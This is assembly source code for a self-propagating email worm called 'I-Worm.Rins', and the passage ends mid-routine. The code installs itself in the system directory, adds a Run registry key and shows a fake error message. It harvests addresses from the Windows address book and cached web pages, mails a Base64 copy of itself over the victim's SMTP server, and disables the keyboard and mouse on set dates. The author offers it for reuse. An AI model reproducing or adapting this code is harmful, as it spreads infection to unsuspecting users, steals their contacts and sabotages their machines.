
;-----------------------------------------------------------------------------
;-------------------------------     -----------------------------------------
;-----------------------------         ---------------------------------------
;--------------------------- I-Worm Rins  ------------------------------------
;-----------------------------         ---------------------------------------
;-------------------------------     -----------------------------------------
;-----------------------------------------------------------------------------

; After my 1st worm (I-Worm.Netav) i tried in this one to reduce the 
; size(No extrn cmd) and add a little sploit(MS01-20, thanx to mar00n).
; Feel free to use everything you want in this source code.
; Thanx to Petik and Benny, i learn a lot with your worms.

; Size = 5120
; tasm32 /ml /m9 xxx
; tlink32 -Tpe -aa xxx
; upx -9 xxx

.386p
.model flat

;--------------------------- Include Zone ------------------------------------

MEM_COMMIT		    		equ	00001000h
MEM_RESERVE		    		equ	00002000h
PAGE_READWRITE		    	equ	00000004h
PAGE_READONLY		    	equ	00000002h
FILE_ATTRIBUTE_NORMAL	    	equ	080h
OPEN_EXISTING		    	equ	03h
FILE_SHARE_READ		    	equ	01h
GENERIC_READ	 	    	equ	80000000h
FILE_MAP_WRITE		    	equ	00000002h
FILE_MAP_READ		    	equ	00000004h
CREATE_ALWAYS	            equ	2
GENERIC_WRITE	            equ	40000000h

;-------------------------- Macro Zone ---------------------------------------


@INIT_SehFrame  	macro	Instruction
	local   	OurSeh
      call    	OurSeh
      mov     	esp,[esp+08h]
      Instruction
OurSeh:
      xor     	edx,edx
      push    	dword ptr fs:[edx]
      mov     	dword ptr fs:[edx],esp
                	endm

@REM_SehFrame   	macro
      xor     	edx,edx
      pop     	dword ptr fs:[edx]
      pop     	edx
                	endm

@pushsz         	macro	string
      local   	Str
      call    	Str
      db      	string,0
Str:            	endm


api 			macro a
	call    	dword ptr [a]
			endm

;------------------------ Constantes Zone ------------------------------------
       
SEH             	equ	1                    		; SEH protection

NbEmailWanted   	equ   80                        	; Nb Email to Seek >1 
EmailSize       	equ   64                         	; Attention rol eax,6 (2^6)
EmailInMemSize   	equ   (EmailSize*(NbEmailWanted+1)) ; For VirtualAlloc (+Security)    
NbToSend        	equ   50                         	; Send x emails per session

MimeHeaderSize	equ	1024					; Mime Header size

;-----------------------------------------------------------------------------
;--------------------------- Code Zone ---------------------------------------
;-----------------------------------------------------------------------------

.code

Rins:	
    	pushad
               
      IF      	SEH
      @INIT_SehFrame <jmp ExitRins>             	; Init SEH      
      ENDIF
	
;------------------------- Get Kernel Base + Api -----------------------------

KernelBase&Api:
	call		KBase&Api					; Get Kernel Base + Api
                 
;------------------------- Check & Mark Presency -----------------------------

TryToOpenOurMutex:
      xor 		eax, eax
    	@pushsz	'RinsMutex'                       	; Mutex Name                               
      push    	eax
      push    	eax
      api     	_OpenMutexA                      	; already in mem
      or      	eax,eax
      jnz     	ExitRins                          	; Yes, do nothing more 
                  
CreateOurMutex:
      xor     	eax, eax
      @pushsz 	'RinsMutex'                       	; Mutex Name                               
      push    	eax                             	; No owner
      push    	eax                             	; default security attrib
      api     	_CreateMutexA                    	; create Our Mutex
      mov     	dword ptr[MutexHdl], eax

;---------------------------- Random Init ------------------------------------

RandomInit:
      api     	_GetTickCount
      mov     	RandomNb, eax
 
;---------------------- Hide Process on Win9x --------------------------------
        
HideProcess:          
	xor		eax, eax                          
	mov		eax, dword ptr [_RegisterServiceProcess]
	test    	eax, eax
	jz      	GetOurPathName
	push    	01h
	push    	00h
	call    	eax       
       
;----------------------- Copy Worm in Sys Dir --------------------------------

GetOurPathName:
      xor     	eax, eax
      push    	eax
	api     	_GetModuleHandleA                	; Our Handle	  
      push    	260
	push    	offset MyPath
	push    	eax
	api     	_GetModuleFileNameA              	; Our Path       
        
CreateDestPath:
      push    	260
	push    	offset TempPath&Name
	api     	_GetSystemDirectoryA             	; System Dir

      @pushsz 	'\RINS.EXE'
	push    	offset TempPath&Name
      api     	_lstrcat                         	; Path+Name of File to Create   

CheckHowExecuted:
      push    	offset MyPath
      push    	offset TempPath&Name
      api     	_lstrcmp
      test    	eax, eax
      jz      	AutoRun

CreateOurFile:
      xor     	eax, eax
      push    	eax                             	; Overwrite mode set
      push    	offset TempPath&Name            	
      push    	offset MyPath
      api     	_CopyFileA                       	; Copy Worm in Sys Dir

        
;------------------------- Registry Worm -------------------------------------

RegWorm:
      push    	offset TempPath&Name
      api     	_lstrlen          
	push    	eax
	push    	offset TempPath&Name
	push    	1
	@pushsz 	"Rins Task"
	@pushsz 	"Software\Microsoft\Windows\CurrentVersion\Run"
	push    	80000002h
	api     	_SHSetValueA

;-------------------- First Launch Fake Message ------------------------------

FakeMessage:
 	push    	1040                        
      @pushsz 	'Status'					; maybe i should do
      @pushsz 	'Not Enought Memory'			; a little better
      push    	0
      api     	_MessageBoxA

;----------------------- Emails address in Memory ----------------------------
AutoRun:
	call		EmailInMem					; Wab & Html emails in mem

;-------------------------- Spread the Worm ----------------------------------
     
Check_if_Connected:
      push    	offset SystemTimeData
      api     	_GetSystemTime
	call		PayAnniv

      push    	0
      push    	offset IConnectedStateTemp
      api		_InternetGetConnectedState
      dec     	eax
      jnz    	No_internet                     	; No connection

      call    	SendEmail                       	; Send Wab Email 1st+Rnd Email
      jmp     	ExitRinsMutex                     	; Then Bye

No_internet:
      push    	5*60*1000                         	; 5 min
      api     	_Sleep
      jmp     	Check_if_Connected
              
;----------------------------- The End ---------------------------------------

ExitRinsMutex:
      push    	dword ptr[MutexHdl]
      api     	_CloseHandle
	call		FreeTheMem

ExitRins:

      IF      	SEH
      @REM_SehFrame                           		; Restore SEH
      ENDIF
         
      popad
                
      push    	0
      api     	_ExitProcess                     	; Quit


	db		':::::    I-Worm.Rins by Tony    :::::',0dh,0dh
	db		'::::: V1.2  Light Size + Sploit :::::',0dh,0dh


;-----------------------------------------------------------------------------
;-----------------------------------------------------------------------------
;------------------------- Sub Routine Zone ----------------------------------
;-----------------------------------------------------------------------------
;-----------------------------------------------------------------------------


;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;........................ Major Sub Routine ..................................
;............................ Z O N E ........................................
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

;............................ Payload ........................................
;.............................................................................

PayAnniv:
      lea     	esi, SystemTimeData              
      movzx   	ecx, word ptr[esi+6]            	; Esi point day
	cmp		ecx, 23				      ; Anniv	
	je		KeyboardOut
OtherOne:
	cmp		ecx, 17		    	
	jne		NoPay

KeyboardOut:
      push    	0
      @pushsz 	'rundll32.exe keyboard,disable'
      api    	_WinExec

MouseOut:
      push   	0
      @pushsz 	'rundll32.exe mouse,disable'
      api    	_WinExec   
NoPay:
	ret

;....................... Emails @ in Memory ..................................
;.............................................................................


EmailInMem:
	mov		dword ptr[NbEmailFound], 0

ReserveMem_For_EmailInMem:
      xor     	eax,eax
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	EmailInMemSize
	push    	eax                             	; System decide where 
	api     	_VirtualAlloc
	or      	eax,eax
	jz      	EmailInMemError                  	; Alloc Fail 
      mov     	dword ptr[EmailList], eax

EmailSeeker:
      call    	SearchWabFile_Email             	; Search Email address book
      call    	SearchHtmFile_Email             	; Search Email HTML
EmailInMemError:
	ret


;........................ Find Email in HTML .................................
;.............................................................................

; Recursive Search from Internet Path for Email in Html

SearchHtmFile_Email:
      call    	Clear_TempPath&Name     
        
	push    	00h
	push    	20h						; Internet Path      
	push    	offset TempPath&Name
	push    	00h
	api		_SHGetSpecialFolderPathA

	push    	offset TempPath&Name
	api     	_SetCurrentDirectoryA			; Selected dir = Internet Path

	lea		eax, SeekHtmlCurrentDir
	mov		dword ptr[RoutineToCall], eax
	call    	AllSubDirSearch				; Action = SeekHtmlCurrentDir
	ret	  

;.............. Seek Html in Current Dir

; IN:	Selected Current dir
; OUT:  Emails in reserved Mem
        
SeekHtmlCurrentDir:
      cmp     	dword ptr[NbEmailFound], NbEmailWanted 	; ENOUGH EMAILS FOUND !
      je      	HtmlEmailSearchEnd                     	; YES...

      lea     	edi, search
      push    	edi
	@pushsz 	'*.*htm*'
	api     	_FindFirstFileA		
	inc		eax
	jne		SeekEmail_Html
	ret

SeekEmail_Html:	
      dec		eax
	xchg    	eax,esi

SeekEmail_Html_Loop:

      call    	SeekEmail_In_ThisHtml		       	; Parse Html 4 emails
        
      cmp     	dword ptr[NbEmailFound], NbEmailWanted 	; ENOUGH EMAILS FOUND !
      je      	HtmlEmailSearchFin                     	; YES...
      					
	push    	edi				
	push    	esi
	api     	_FindNextFileA				
	dec     	eax
	je      	SeekEmail_Html_Loop

HtmlEmailSearchFin:
	push    	esi
	api     	_FindClose				
HtmlEmailSearchEnd:	
      ret

;.............. Parse Html for emails

SeekEmail_In_ThisHtml:
	pushad
	push    	0
	push    	FILE_ATTRIBUTE_NORMAL
	push    	OPEN_EXISTING
	push    	0
	push    	FILE_SHARE_READ
	push    	GENERIC_READ
      lea     	eax, [search.FileName]
	push    	eax
	api     	_CreateFileA				
	inc     	eax
	je		HtmlEmailSearchEnd            	
	dec		eax                             	
	xchg    	eax,ebx

	xor		eax,eax
	push    	eax
	push    	eax
	push    	eax
	push    	PAGE_READONLY
	push    	eax
	push    	ebx
	api     	_CreateFileMappingA			
	test    	eax,eax
	je		CloseHtmlHandle
	xchg    	eax,ebp

	xor		eax,eax
	push    	eax
	push    	eax
	push    	eax
	push    	FILE_MAP_READ
	push    	ebp
	api     	_MapViewOfFile				
	test    	eax,eax
	je		CloseHtml_MapHandle
	xchg    	eax,esi
      mov     	[maphandlemail],esi
      mov     	[esi_save],esi

	push    	0
	push    	ebx
	api     	_GetFileSize				
	xchg    	eax,ecx
	jecxz   	CloseHtml_MapViewHandle
      inc     	ecx
      jz      	CloseHtml_MapViewHandle         	; GetFileSize Error ?
      dec     	ecx
FixBugOverflow:
      sub     	ecx, 8
      cmp     	ecx, 0
      jl      	CloseHtml_MapViewHandle

SeekMailToStr:
      mov     	esi,[esi_save]        
	call    	MTStr
	db		'mailto:'
MTStr: 
	pop		edi

ScanFor_MailTo:
	pushad
	push    	7
	pop		ecx
	rep		cmpsb						; search for "mailto:"
	popad								; string
	je		MailToFound_CheckEmail		      ; check the mail address
	inc		esi
      dec     	ecx
	jnz     	ScanFor_MailTo		

CloseHtml_MapViewHandle:
	push    	[maphandlemail]
	api     	_UnmapViewOfFile		
CloseHtml_MapHandle:
	push    	ebp
	api     	_CloseHandle				
CloseHtmlHandle:
	push    	ebx
	api     	_CloseHandle				
	popad
	ret

MailToFound_CheckEmail:
      inc     	esi
      mov     	[esi_save],esi
      dec     	esi

	mov		edi, dword ptr [EmailList]      	; STORE THE EMAIL in the   
      mov     	edx, dword ptr [NbEmailFound]
      rol     	edx, 6                          	; 64 = email size stockage
      add     	edi, edx                        	; goto next place
        
      mov     	[EmailCurrentPos], edi
        
	xor		edx,edx
	add		esi,7
	push    	edi						; mail address

NextChar:	
      lodsb
	cmp		al, ' '
	je		SkipChar

	cmp		al, '"'                        	; eMail End ?
	je		EndChar
      cmp     	al, '?'                        	; eMail End ?
      je      	EndChar    
      cmp     	al, '>'                        	; eMail End ?
      je      	EndChar      
      cmp     	al, '<'                        	; eMail End ?
      je      	EndChar      
      cmp     	al, ']'                        	; eMail End ?
      je      	EndChar              
	cmp		al, ''''                       	; eMail End ?
	je		EndChar

	cmp		al, '@'                        	; Valid email ?
	jne		CopyChar
	inc		edx
CopyChar:	  
      stosb
	jmp		NextChar
SkipChar:
	inc		esi
	jmp		NextChar
EndChar:	
      xor		al,al
	stosb
	pop		edi
	test    	edx,edx					; if EDX=0, mail is not
	je		SeekMailToStr				; valid (no '@')
      
      cmp     	dword ptr [NbEmailFound], 0
      je      	NoEmailYet
       
      mov     	edi, [EmailCurrentPos]
      mov     	eax, [edi]
      sub     	edi, 64
      cmp     	eax, [edi]
      je      	SeekMailToStr
        
NoEmailYet:     
      inc     	dword ptr [NbEmailFound]       
      cmp     	dword ptr[NbEmailFound], NbEmailWanted 	; ENOUGH EMAILS FOUND !
      je      	CloseHtml_MapViewHandle                	; YES...        
        
	jmp		SeekMailToStr			       	; get next email address


;........................ Find Email in WAB ..................................
;.............................................................................

SearchWabFile_Email:
      call    	Clear_TempPath&Name

GetWabPath:       
      mov     	dword ptr[KeySize], 260         	; Init Size to get
        
	push    	offset KeySize
	push    	offset TempPath&Name
	push    	offset Reg
	push    	0  
	@pushsz 	"Software\Microsoft\Wab\WAB4\Wab File Name"
	push    	80000001h
	api		_SHGetValueA
      test    	eax, eax
      jne     	EndWab

Open&Map_WabFile:
	call		Open&MapFile
	jc		EndWab
        
WabSearchEmail:
      mov     	ecx, [eax+64h]                  	; Nb of address
      jecxz   	WabUnmapView                    	; No address
      mov     	dword ptr[NbEmailFound], ecx    	; For the Html search
      mov     	[NbWabEmail],ecx                	; For the emailfile
TruncFriend:        
      cmp     	ecx, NbEmailWanted              	; Too many Friend
      jbe     	NotManyFriend
      mov     	ecx, NbEmailWanted              	; To many @, reduce it
      dec     	ecx                             	; for Html search (inc [NbEmailFound]!)
      mov     	dword ptr[NbEmailFound], ecx    	; For the Html search
      mov     	[NbWabEmail],ecx                	; For the emailfile                
NotManyFriend:        
      mov     	esi, [eax+60h]                  	; email @ array
      add     	esi, eax                        	; normalise
      mov     	edi, dword ptr[EmailList]       	; where store email

GetWabEmailLoop:
      call    	StockWabEmail
      dec     	ecx
      jnz     	GetWabEmailLoop

WabUnmapView:        
	call		Open&MapFileUnmapView

EndWab:
      ret

StockWabEmail:        
      push    	ecx esi   
      push    	40h
      pop     	ecx
      cmp     	byte ptr [esi+1],0
      jne     	StockWabEmailLoop
        
StockWabEmailUnicodeLoop:
      lodsw                                   		; Unicode
      stosb                                   		; Ansi
      dec     	ecx
      test    	al, al
      jne     	StockWabEmailUnicodeLoop
      add     	edi, ecx                        	; next email field in Dest
      pop     	esi ecx
      add     	esi, 44h                        	; next email field in Wab
      ret

StockWabEmailLoop:
      movsb                                   		; Ansi
      dec     	ecx
      test    	al, al
      jne     	StockWabEmailLoop
      add     	edi, ecx                        	; next email field in Dest
      pop     	esi ecx
      add     	esi, 24h                        	; next email field in Wab
      ret

;.......................... Send Email SMTP ..................................
;.............................................................................


SendEmail:     
      call    	GetUserSmtpServer				; Default Smtp Serveur Found ?
      jc      	SendError    				; No   

	call		AttachementSendInit			; init attachement file
    
      mov     	ebx, NbToSend                   	; Send NbToSend emails per session
SendRandomEmailLoop:
      call    	SelectEmail                     	; return email ads in esi
	jecxz   	SendError					; EmailListe empty or NonExploitable

      lea     	edi, CurrentEmail               	; <-----------------
      mov     	ecx, EmailSize                  	;                   |
      rep     	movsb                           	; Copy rnd Email in |
	
NormalSend:       
	call		BuildMessageHeader			; build the mime header

      call    	SmtpConnection
      jc      	SendNext					; smtp error
      call    	SmtpSendCommand
      jc      	SendNext					; smtp error
	call    	SmtpDisConnection

SendNext:
	call		ClearHeaderMem
      dec     	ebx
      jnz     	SendRandomEmailLoop             	; Send #NbToSend emails

SendError:
	ret

;.............. Select Email to Send 

; OUT:  		esi point on the email   
;       		ecx = 0 if error
;       		select first the email from the *.WAB

SelectEmail:
	mov		ecx, NbEmailWanted
	inc		ecx
SelectIT:
	dec		ecx
	jz		SelectEmailError		

      mov     	esi, dword ptr [EmailList]     	; emails from file in memory

	mov		edi, NbEmailWanted			; Rnd Range
      call    	GetRndNumber                    	; Rnd Nb in edx

      cmp     	dword ptr[NbWabEmail], 0
      je      	TriEMails
        
	dec		dword ptr[NbWabEmail]
	mov		edx, dword ptr[NbWabEmail]

TriEMails:      
      rol     	edx, 6                          	; edx*emailsize (64)        
      add     	esi, edx                        	; esi on the email
  
      mov     	eax, dword ptr [esi]
      test    	eax, eax                        	; No empty email
      je      	SelectIT
      mov     	eax, dword ptr [esi]
      or      	eax, 20202020h                  	; Lower case
      cmp     	eax, 'mbew'                     	; No webmaster@xxxxxxxx
      je      	SelectIT
      mov     	eax, dword ptr [esi]
      or      	eax, 20202020h                  	; Lower case
      cmp     	eax, 'ptth'                     	; No http:\\xxxxxxxxxxx
      je      	SelectIT
SelectEmailError:	  
      ret

;.............. Init The Attachement File 

;Init du mess: header + body

AttachementSendInit:

InitWhoSendName:
	call		ResMemHeader				; Some Mem for the mime header

      mov     	dword ptr[KeySize], 00000040h   	; Init Size to get

	push   	offset KeySize
	push    	offset mailfrom
	push    	offset Reg
      @pushsz 	"SMTP Email Address"          	; User mail (for mail from:)
      lea     	eax, AccountKey
      push    	eax
	push    	80000001h
	api     	_SHGetValueA

InitWormName:
      xor     	al,al
      mov     	ecx,260
      lea     	edi, MyPath  
      rep     	stosb
        
      push    	260
	push    	offset MyPath
	api     	_GetSystemDirectoryA             	; System Dir

      @pushsz 	'\RINS.EXE'
	push    	offset MyPath
      api     	_lstrcat                         	 

SmtpNormalSendInit:	
	call		CodeB64File  				; return worm file encoded in mem

	ret

;.............. Build Message Header

BuildMessageHeader:
	push		ebx						; for the loop

BuildHeader:
	mov		esi, dword ptr[MemMessageBody1]	; some mem

BuildFrom:
      @pushsz 	'From: '					; From: 
	push    	esi
      api     	_lstrcat                          

	push		offset mailfrom				; user mail
	push		esi
	api		_lstrcat

	@pushsz	CRLF
	push		esi
	api		_lstrcat

BuildTo:
	@pushsz	'To: '					; To:
	push		esi
	api		_lstrcat
	
	push		offset CurrentEmail			; Email found in *.wab or Html
	push		esi
	api		_lstrcat
	
	@pushsz	CRLF
	push		esi
	api		_lstrcat
	
BuildSubject:
	@pushsz	'Subject: '					; Subject:
	push		esi
	api		_lstrcat
	
	push		NbSubject					; nb Subject
	pop		edi
	call		GetRndNumber				; edx = rnd nb
	
	lea		edi, RndSubjectTb
	rol		edx, 2					; table de dd
	add		edi, edx					; Point the right Subject offset
	mov		edi, [edi]

	push 		edi						; Rnd Subject
	push		esi
	api		_lstrcat
	
	@pushsz	CRLF
	push		esi
	api		_lstrcat

BuildBody:
	push 		offset MessageBody1			; Mime bordel jusqu'a -> email message
	push		esi
	api		_lstrcat

BuildSizeBody1:
	push		esi	
	api		_lstrlen

	mov		dword ptr[MessageSize1], eax		; Header+Mime bordel lenght for send cmd

BuildMessageHeaderError:
	pop		ebx						; for the loop
	ret

;.............. Some Mem For The Mime Header

ClearHeaderMem:
      xor     	al,al
      mov     	ecx, MimeHeaderSize
	mov		edi, dword ptr[MemMessageBody1]
      rep     	stosb
	ret

;.............. Some Mem For The Mime Header

ResMemHeader:
      xor     	eax,eax
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	MimeHeaderSize
	push    	eax                             	; System decide where 
	api     	_VirtualAlloc
	mov		dword ptr[MemMessageBody1], eax
	ret

;........................... Send via SMTP ...................................
;.............................................................................

; 4 Part: 
;         		- GetLocalSmtpServeur: Find default SMTP server
;         		- SmtpConnection:      Init Socket + Connect to Smpt host
;         		- SmtpSendCommand:     Send all the commands
;         		- SmtpDisConnection:   Clean + Disconnect


;.............. Get User Server

GetUserSmtpServer:

GetUserInternetAccount:
      mov     	dword ptr[KeySize], 00000040h   	; Init Size to get
         
	push    	offset KeySize
	push    	offset AccountSubKey
	push    	offset Reg
	@pushsz 	"Default Mail Account"
	@pushsz 	"Software\Microsoft\Internet Account Manager"
	push    	80000001h
	api     	_SHGetValueA
      test    	eax, eax
      jne     	GetUserSmtpServerError

GetUserInternetServer:
      mov     	dword ptr[KeySize], 00000040h   	; Init Size to get

	push    	offset KeySize
	push    	offset SmtpServeur
	push    	offset Reg
	@pushsz 	"SMTP Server"
      lea     	eax, AccountKey
      push    	eax
	push    	80000001h
	api     	_SHGetValueA
      test    	eax, eax
      jne     	GetUserSmtpServerError        
      clc
      ret       
GetUserSmtpServerError:
      stc
      ret

;.............. Smtp Connection
                                                
SmtpConnection:
	pushad
	push    	offset WSAData                  	; Struct WSA
	push    	101h                        		; VERSION1_1
	api     	_WSAStartup					; Socket Init
	test    	eax,eax                         	; ok ?
	jne		WSA_Error                       	; No, exit with stc 

	push    	0                               	; Protocol = 0 (more sure)
	push    	1                               	; SOCK_STREAM
	push    	2                               	; AF_INET (most used)
	api     	_socket					; create socket
	inc		eax                             	; -1 = error
	je		Socket_Error                    	; WSACleanUp and stc
	dec		eax
	mov		[hSocket],eax                   	; Socket Handle

	push		25						; Smtp port
	api		_htons					; Convert it
	mov		word ptr[wsocket+2], ax			; The port ( 2 ptr[wsocket]=AF_INET )

	push    	offset SmtpServeur              	; The SMPT Host
	api     	_gethostbyname				; SMPT to IP
	test    	eax,eax                         	; error ?
	je		Error_CloseSocket&CleanUp       	; Exit + stc                
	mov		eax,[eax+10h]                   	; get ptr 2 IP into HOSTENT
	mov		eax,[eax]                       	; get ptr 2 IP
	mov		[ServeurIP],eax				; Save it

	push    	010h		          			; size of sockaddr struct
	push    	offset wsocket                  	; Ptr on it
	push    	[hSocket]                       	; Handle
	api     	_connect					; connect to smtp server
	inc		eax
	je		Error_CloseSocket&CleanUp       	; Exit + stc
	call    	GetServeurReply				; get server response
	jc		Error_CloseSocket&CleanUp       	; If c=0 Connection OK !
	popad
	clc
	ret

GetServeurReply:
	push    	0                               	; Flags
	push    	4                               	; Get a LongWord
	push    	offset ServeurReply             	; in ServeurReply
	push    	[hSocket]
	api     	_recv                            	; get stmp server error code
	cmp		eax, 4                          	; Receive a LongWord  
	jne		ReplyError                      	; No, stc

ServeurReplyLoop:	
      mov		ebx, offset ServeurReplyEnd     	; Get a byte In
	push    	0                               	; Flags
	push    	1                               	; a byte
	push    	ebx
	push    	[hSocket]
	api     	_recv
	jne		ReplyError

	cmp		byte ptr [ebx], 0Ah
	jne     	ServeurReplyLoop				; skip over CRLF

	mov		eax, [ServeurReply]
	cmp		eax, ' 022'					; error code
	je		ReplyOk
	cmp		eax, ' 052'					; error code
	je		ReplyOk
	cmp		eax, ' 152'					; error code
	je		ReplyOk
	cmp		eax, ' 453'					; error code
	jne		ReplyError
ReplyOk:	  
      clc
	ret
ReplyError:	
      stc
	ret

;.............. Smtp DisConnection

SmtpDisConnection:
	pushad
Error_CloseSocket&CleanUp:
	push    	dword ptr [hSocket]
	api     	_closesocket
Socket_Error:
      api     	_WSACleanup        
WSA_Error:	
      popad
	stc
	ret

;.............. Smtp Send

SmtpSendCommand:
	pushad

SendHelloCmd:
	mov     	esi,offset cmd_helo          		; 'HELO xxx',CRLF
	push    	14                              	; cmd size
	pop		ecx                             	; cmd size
	call    	SendSocket					; send HELO command
	call    	GetServeurReply                 	; Ok ?
	jc      	Error_CloseSocket&CleanUp       	; No

SendMailFromCmd:
	mov		esi,offset cmd_mailfrom         	; 'MAIL FROM:<'
	push    	11                              	; cmd size
	pop     	ecx                             	; size
	call    	SendSocket					; send MAIL FROM command

	mov		esi,offset mailfrom             	; ptr default user email
	push		esi
	api		_lstrlen
	xchg		ecx, eax
	call    	SendSocket                        	; 2° Write xxxx@xxxx.xx

	call		Brk1
	db		'>',CRLF
Brk1:	pop		esi
	push    	3
	pop		ecx	
	call    	SendSocket					; 3° Write '>',CRLF

	call    	GetServeurReply                 	; Ok
	jc		Error_CloseSocket&CleanUp       	; No

SendRcptToCmd:
	mov		esi,offset cmd_rcptto           	; 'RCPT TO:<'
	push    	9                               	; cmd size
	pop     	ecx                             	; cmd size
	call    	SendSocket                    	; 1° Write 'RCPT TO:<'

	mov		esi,offset CurrentEmail         	; ptr email
	push		esi
	api		_lstrlen
	xchg		ecx, eax
	call    	SendSocket                        	; 2° Write xxxx@xxxx.xx

	call		Brk2
	db		'>',CRLF
Brk2:	pop		esi
	push    	3
	pop		ecx	
	call    	SendSocket					; 3° Write '>',CRLF

	call    	GetServeurReply                 	; Ok
	jc		Error_CloseSocket&CleanUp       	; No

SendDataCmd:
	mov		esi,offset cmd_data             	; 'DATA',CRLF
	push    	6                               	; Size
	pop		ecx                             	; Size
	call    	SendSocket					; send DATA command
	call    	GetServeurReply                 	; Ok
	jc		Error_CloseSocket&CleanUp       	; No

SendeMailBody:
	mov		esi, dword ptr[MemMessageBody1] 	; Start Message Body
	mov		ecx, dword ptr[MessageSize1]
	call    	SendSocket               

      mov     	esi,dword ptr [MemEncoded]		; Encoded File
      mov     	ecx,dword ptr [EncodedFileSize]
	call    	SendSocket       

	mov		esi, offset MessageBody2        	; End Message Body
	mov		ecx, MessageSize2
	call    	SendSocket                     

SendTermCmd:
	mov		esi,offset cmd_term             	; CRLF,'.',CRLF
	push    	5                               	; size
	pop		ecx                             	; size
	call    	SendSocket					; send message header+body
	call    	GetServeurReply                 	; Ok ?
	jc		Error_CloseSocket&CleanUp       	; No

SendQuitCmd:
	mov		esi,offset cmd_quit             	; 'QUIT',CRLF
	push    	6                               	; size
	pop		ecx                             	; size
	call    	SendSocket					; send QUIT command
	popad
      clc
	ret

SendSocket:
	push   	0                               	; Flags
	push    	ecx                             	; size
	push    	esi                             	; Source
	push    	[hSocket]                       	; Handle
	api     	_send
	ret


;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;........................ Minor Sub Routine ..................................
;............................ Z O N E ........................................
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


;.......................... K32 base + Api ...................................
;.............................................................................

; Find kernel base + all api needed -> no extrn -> little size

KBase&Api:
	mov		eax, [esp+44]
KLoop:    
      xor     	ax,ax    
      cmp     	word ptr [eax],"ZM"
      jnz     	KNext
KPe:   
      mov     	ebx,[eax+3Ch]
      add     	ebx,eax
      cmp     	dword ptr [ebx],"EP"
      jz      	LoadGetProc         
KNext:
      dec     	eax
      jmp     	KLoop     

LoadGetProc:							
	mov		ebx, eax
	mov		ecx, eax

      add 		ecx, [ecx + 03ch]  			; AV check for eax there   			
      mov 		ecx, [ecx + 078h]   
	xchg		eax, ecx  			
      add 		eax, ebx              		
      add 		eax, 018h	
      xchg 		eax, esi       
 
      lodsd          					
      push 		eax       				
      inc 		eax        				 
	push 		eax       				
      lodsd          					
      push 		eax       				
      lodsd          					
      push 		eax       				
      lodsd         	 				
      push 		eax       				
        
      mov		eax, [esp + 4]        		
      add 		eax, ebx              			
      xchg 		eax, esi             
  
GetProcSeek:
      dec 		dword ptr [esp + 0ch]           
      lodsd          					
      add 		eax, ebx    				
    
	xchg		esi, eax
	lea		edi, GetProcName
	mov		ecx, 15
	rep		cmpsb
	xchg		esi, eax
	jnz		GetProcSeek	
     
      mov 		eax, [esp + 010h]     			
      sub 		eax, [esp + 0ch]      			
	shl		eax, 1					
      add 		eax, [esp]            		
      add 		eax, ebx              			
      xchg 		eax, esi             
      xor 		eax, eax              
      lodsw                    				
      shl 		eax, 2                			
      add 		eax, [esp + 08h]      			
      add 		eax, ebx              			
      xchg 		eax, esi
      lodsd                   				
      add 		eax, ebx              			
      add 		esp, 14h               			

SeekAllApi:
      lea		edi, _GetProcAddress
	stosd 
	push		offset LoadLibName
	push		ebx
	api		_GetProcAddress
	stosd

	lea		esi, ApiToFind
	lea		edi, ApiFinded

SeekAllApiLoop:
	lodsw
	test		ax, ax
	jz		AllApiOk
	dec		esi
	dec		esi

	push		esi
	api		_LoadLibraryA
	xchg		eax, ebx
	
FindEndName:	
	inc		esi
	mov		al, byte ptr [esi]
	test		al, al
	jnz		FindEndName
	inc		esi

SameModule:
	lodsb
	test		al, al
	jz		SeekAllApiLoop	
	dec		esi

	push		esi
	push		ebx
	api		_GetProcAddress
	stosd
	jmp		FindEndName

AllApiOk:
	ret

;........................ Open & Map a File ..................................
;.............................................................................


; IN:			TempPath&Name = Path + Name of file to Open
; OUT:		fhandle, maphandle, mapaddress
;			cf = 0 ou 1

Open&MapFile:
      xor     	eax,eax
      push    	eax
      push    	FILE_ATTRIBUTE_NORMAL
      push    	OPEN_EXISTING
      push    	eax
      push    	FILE_SHARE_READ
      push    	GENERIC_READ or GENERIC_WRITE		
      push    	Offset TempPath&Name
      api     	_CreateFileA
      inc     	eax
      je      	Open&MapFileError
      dec     	eax
      mov     	dword ptr [fhandle], eax

      xor     	eax,eax
      push    	eax
      push    	eax
      push    	eax                             
      push    	PAGE_READWRITE	            	
      push    	eax
      push    	dword ptr [fhandle]
      api     	_CreateFileMappingA
      or      	eax,eax                       
      jz      	Open&MapFileCloseFileHandle
      mov     	dword ptr [maphandle],eax

      xor     	ebx,ebx
      push    	ebx                             	
      push    	ebx
      push    	ebx
      push    	FILE_MAP_WRITE				
      push    	eax
      api     	_MapViewOfFile
      or      	eax,eax                         	
      jz      	Open&MapFileCloseMapHandle
      mov     	dword ptr [mapaddress], eax	
	clc
	ret								

Open&MapFileUnmapView:  
      push    	dword ptr [mapaddress]          	
      api     	_UnmapViewOfFile

Open&MapFileCloseMapHandle: 
      push    	dword ptr [maphandle]           	
      api     	_CloseHandle

Open&MapFileCloseFileHandle: 
      push    	dword ptr [fhandle]            	
      api     	_CloseHandle     
Open&MapFileError:
	stc
	ret


;.............. Search in all Sub Dir + Action in ............................

; IN:			- Root dir Selected for the Search begin
;			- RoutineToCall = SeekHtmlCurrentDir
; OUT: 		- What perform RoutineToCall in all subdir of selected Root


AllSubDirSearch:
	xor     	ebx,ebx                         	; Dir counter

FindFirstDir:
      lea    	edi, search                    
	push    	edi
      @pushsz 	"*.*"                        
      api     	_FindFirstFileA

      mov     	dword ptr [RecSearchHandle],eax 	; Save search handle pour remonter

      inc     	eax
      jz      	FirstDirNotFound

DirTravel:
      bt      	word ptr[search.FileAttributes],4 	; Any kind directory
      jnc     	FindNextDir                     
                                                
      lea     	eax,[search.FileName]

	cmp     	byte ptr [eax],"."              	; No "." or ".."
      jz      	FindNextDir                   

      push    	eax                             	; Set the new directory
      api     	_SetCurrentDirectoryA

InNewDir_Action:
	pushad
	call    	dword ptr[RoutineToCall]		; THE Action    
	popad

	push    	dword ptr [RecSearchHandle]     	; Search Handle saved
	inc     	ebx                             	; Go Depeer
	jmp     	FindFirstDir
FindNextDir:
	push    	edi                             	; Search for another dir
